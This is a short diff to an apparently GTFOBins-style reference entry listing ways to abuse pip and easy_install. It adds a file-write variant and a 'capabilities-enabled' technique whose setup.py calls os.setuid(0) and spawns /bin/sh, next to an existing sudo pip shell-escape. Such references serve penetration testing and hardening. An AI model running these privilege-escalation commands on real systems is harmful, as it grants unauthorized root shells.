@@ -50,8 +50,9 @@ functions:
   file-write:
     - description: It needs an absolute local file path.
       code: |
+        export LFILE=/tmp/file_to_save
         TF=$(mktemp -d)
-        echo 'open("/tmp/file_to_write","w+").write("DATA")' > $TF/setup.py
+        echo "open('$LFILE','w+').write('DATA')" > $TF/setup.py
         pip install $TF
   file-read:
     - description: The read file content is corrupted as wrapped within an exception error.
@@ -69,4 +70,9 @@ functions:
         TF=$(mktemp -d)
         echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
         sudo pip install $TF
+  capabilities-enabled:
+    - code: |
+        TF=$(mktemp -d)
+        echo "import os; os.setuid(0); os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
+        ./easy_install  
 ---
